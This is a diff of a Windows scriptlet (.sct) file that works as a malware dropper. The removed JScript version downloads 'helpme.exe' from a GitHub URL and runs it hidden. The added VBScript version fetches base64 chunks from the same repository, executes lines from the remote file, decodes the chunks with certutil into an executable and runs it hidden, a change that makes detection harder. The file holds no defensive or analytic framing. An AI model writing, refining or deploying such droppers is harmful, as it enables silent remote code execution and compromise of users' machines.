@@ -1,23 +1,45 @@
-﻿<?XML version="1.0"?>
+<?XML version="1.0"?>
 <scriptlet>
-<registration
-    progid="Test"
-    classid="{A1112221-0000-0000-0000-0000FEEDC0DE}" >
-</registration>
-<script language="JScript">
+<registration progid="Test" classid="{A1112221-0000-0000-0000-0000FEEDC0DE}" />
+<script language="VBScript">
 <![CDATA[
-    var Win = new ActiveXObject("WScript.Shell");
-    var http = new ActiveXObject("MSXML2.XMLHTTP");
-    http.open("GET", "https://raw.githubusercontent.com/jarred09170/cache/main/helpme.exe", false);
-    http.send();
-    var stream = new ActiveXObject("ADODB.Stream");
-    stream.Open();
-    stream.Type = 1;
-    stream.Write(http.responseBody);
-    var temp = Win.ExpandEnvironmentStrings("%TEMP%") + "\\helpme.exe";
-    stream.SaveToFile(temp, 2);
-    stream.Close();
-    Win.Run(temp, 0, false);
+    Dim http, chunks, i, line, base64, tempPath, wsh, fs, f
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.open "GET", "https://raw.githubusercontent.com/jarred09170/cache/main/chunks.txt", False
+    http.send
+    Set wsh = CreateObject("WScript.Shell")
+    Set fs = CreateObject("Scripting.FileSystemObject")
+    
+    ' Execute each line to set environment variables
+    For Each line In Split(http.responseText, vbCrLf)
+        If InStr(line, "set ") = 1 Then
+            Execute line
+        End If
+    Next
+    
+    ' Concatenate all chunks (loop up to 999; break when empty)
+    base64 = ""
+    For i = 0 To 999
+        Dim chunk
+        chunk = Eval("C" & i)
+        If IsEmpty(chunk) Then Exit For
+        base64 = base64 & chunk
+    Next
+    
+    ' Write base64 to a temporary file
+    tempPath = wsh.ExpandEnvironmentStrings("%TEMP%") & "\helpme.b64"
+    Set f = fs.CreateTextFile(tempPath, True)
+    f.Write base64
+    f.Close
+    
+    ' Decode using certutil (trusted Windows tool)
+    wsh.Run "certutil -decode " & tempPath & " " & wsh.ExpandEnvironmentStrings("%TEMP%") & "\helpme.exe", 0, True
+    
+    ' Run the decoded EXE hidden
+    wsh.Run wsh.ExpandEnvironmentStrings("%TEMP%") & "\helpme.exe", 0, False
+    
+    ' Cleanup (optional)
+    ' wsh.Run "del " & tempPath, 0, True
 ]]>
 </script>
 </scriptlet>
